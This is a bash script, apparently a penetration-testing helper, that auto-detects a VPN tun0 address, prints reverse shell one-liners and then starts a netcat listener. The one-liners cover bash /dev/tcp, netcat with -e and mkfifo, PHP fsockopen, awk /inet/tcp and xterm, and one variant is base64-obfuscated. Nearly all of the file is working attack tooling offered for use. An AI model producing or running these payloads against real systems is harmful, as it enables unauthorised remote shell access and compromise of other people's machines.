#!/bin/bash
PORT=9001
LHOST=""

show_help() {
    echo "Usage: $0 [--lhost <IP>] [--lport <PORT>] [--help]"
    echo ""
    echo "Options:"
    echo "  --lhost <IP>      Specify the listener IP address (default: auto-detect tun0)"
    echo "  --lport <PORT>    Specify the listener port (default: 9001)"
    echo "  -h, --help        Show this help message"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --lhost)
            LHOST="$2"
            shift 2
            ;;
        --lport)
            PORT="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo "[!] Unknown option: $1"
            show_help
            ;;
    esac
done

# If no LHOST was provided, try to auto-detect tun0 IP
if [[ -z "$LHOST" ]]; then
    echo -e "[+] No --lhost provided, detecting tun0 IP..."
    tun0=$(ip a | grep -i 'tun0' | grep inet | cut -d '/' -f1 | awk '{print $2}')
    if [[ -z "$tun0" ]]; then
        echo -e "[!] tun0 interface not found. Using placeholder <LHOST>."
        LHOST="<LHOST>"
    else
        echo -e "[+] tun0 IP: $tun0"
        LHOST="$tun0"
    fi
else
    echo -e "[+] Using specified LHOST: $LHOST"
fi

# Validate port (basic check)
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
    echo "[!] Invalid port number: $PORT"
    exit 1
fi

echo -e "\n[+] Linux Reverse Shell Payloads (LHOST=$LHOST, LPORT=$PORT)\n"


B64=$(echo -n "bash -i >& /dev/tcp/$LHOST/$PORT 0>&1" | base64 -w0)



# Bash
echo -e "==================== Bash ===================="
echo -e "bash -i >& /dev/tcp/$LHOST/$PORT 0>&1"
echo -e "bash -c 'bash -i >& /dev/tcp/$LHOST/$PORT 0>&1'"
echo -e "echo $B64 | base64 -d | bash"
echo -e "bash -c '0<&196;exec 196<>/dev/tcp/$LHOST/$PORT; sh <&196 >&196 2>&196'"
echo -e "bash -c 'exec 5<>/dev/tcp/$LHOST/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done'"

# Netcat
echo -e "\n==================== Netcat ===================="
echo -e "nc -e /bin/sh $LHOST $PORT"
echo -e "nc -e /bin/bash $LHOST $PORT"
echo -e "nc -c 'sh' $LHOST $PORT"
echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $PORT >/tmp/f"
echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $PORT >/tmp/f"
echo -e "busybox nc $LHOST $PORT -e sh"
echo -e "busybox nc $LHOST $PORT -e /bin/sh"

# PHP
echo -e "\n==================== PHP ===================="
echo -e "php -r '\$sock=fsockopen(\"$LHOST\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo -e "php -r '\$sock=fsockopen(\"$LHOST\",$PORT);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

# Awk
echo -e "\n==================== Awk ===================="
echo -e "awk 'BEGIN {s = \"/inet/tcp/0/$LHOST/$PORT\"; while(1) {do {printf \"> \" |& s; s |& getline c; if(c) while ((c |& s) > 0) print \$0 |& s; else break;} while(c != \"exit\"); close(s)}}'"

# Xterm (requires X11)
echo -e "\n==================== Xterm ===================="
echo -e "xterm -display $LHOST:1"

echo -e "\n[+] Listener command:"
echo -e "    rlwrap nc -lvnp $PORT   # for better shell"
echo -e '\n'
echo -e "[+] Started Listing below....."
nc -lvnp $PORT
